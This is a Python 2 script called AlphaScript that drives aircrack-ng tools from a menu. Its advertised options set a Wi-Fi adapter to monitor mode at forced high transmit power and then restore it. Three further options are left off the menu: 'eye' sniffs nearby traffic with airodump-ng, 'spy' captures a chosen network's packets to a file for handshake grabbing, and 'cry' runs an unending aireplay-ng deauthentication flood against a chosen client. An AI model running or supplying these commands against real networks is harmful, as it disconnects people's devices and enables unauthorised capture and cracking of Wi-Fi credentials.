from time import sleep
import os,subprocess, sys
adaptername = raw_input("What is the name of your WiFi-adapter? (eg. wlan0, wlan1) " )
running = True
while running == True:
	os.system('clear')
	print(
'''\033[1;34;40m
  ___  _  __      _____           _       _   
 / _ \| |/ _|    /  ___|         (_)     | |  
/ /_\ \ | |_ __ _\ `--.  ___ _ __ _ _ __ | |_ 
|  _  | |  _/ _` |`--. \/ __| '__| | '_ \| __|
| | | | | || (_| /\__/ / (__| |  | | |_) | |_ 
\_| |_/_|_| \__,_\____/ \___|_|  |_| .__/ \__|
	                           | |        
	                           |_|        
- \033[1;31;40m by EKKA
''')

	if not 'SUDO_UID' in os.environ.keys():
	  print "This program requires sudo to function correctly, please relaunch as sudo."
	  sys.exit(1)	
	print("Your adapter name is " + adaptername)
	print("\033[1;37;40mWelcome to AlphaScript - the quick and easy tool to setup your Ralink RTL8812au chipset WIFI Adapter.. or more.")
	print("You have 'three' options:")
	print("\033[1;32;40m 1. Configure adapter and activate monitor mode")
	print("\033[1;31;40m 2. Disable monitor mode and reactiate NetworkManager")
	print("\033[1;33;40m 3. Exit the tool\n\033[1;37;40m")
	option = raw_input("Choose an option: ")
	def AlphaScript():
		if option == "1":
			processing = True
			print("Configuring adapter - this will take a short moment")
			while processing == True:
				subprocess.call(['airmon-ng', 'check', 'kill'])
				subprocess.call(['sudo', 'ip', 'link', 'set', adaptername , 'down'])
				subprocess.call(['sudo', 'iw', 'dev', adaptername , 'set', 'type', 'monitor'])
				subprocess.call(['sudo', 'ip', 'link', 'set', adaptername , 'up'])
				subprocess.call(['sudo', 'iw', adaptername, 'set', 'txpower' , 'fixed', '3000'])
				print("Checking if monitor mode is activated")
				subprocess.call(['airmon-ng', 'start', adaptername ])
				sleep(3)
				print("Configuration completed.")
				break	

		elif option == "2":
				disabling = True
				while disabling == True:
					subprocess.call(['sudo', 'service', 'NetworkManager', 'start'])
					subprocess.call(['sudo', 'ip', 'link', 'set', adaptername , 'down'])
					subprocess.call(['sudo', 'iw', 'dev', adaptername , 'set', 'type', 'managed'])
					subprocess.call(['sudo', 'ip', 'link', 'set', adaptername , 'up'])
					sleep(1)
					print("Disconnected.")
					disabling = False
					break
		elif option == "3":
			running = False
			exit()
		elif option == "eye":
			print("As you wish..")
			subprocess.call(['gnome-terminal', '--window', '--', 'airodump-ng', adaptername])
		elif option == "spy":
			channel = raw_input("What channel? (write as [-c#]) " )
			bssid = raw_input("What BSSID? ")
			subprocess.call(['gnome-terminal', '--window', '--', 'airodump-ng', channel, '-w', 'capture', '-d', bssid, adaptername])
		elif option == "cry":
			accesspoint = raw_input("What is the AP's BBSID? (Same BBSID as before) ")
			client = raw_input("What is the client's BBSID? ")
			subprocess.call(['gnome-terminal', '--window', '--', 'aireplay-ng', '--deauth', '0', '-a', accesspoint, '-c', client, adaptername])
	AlphaScript()
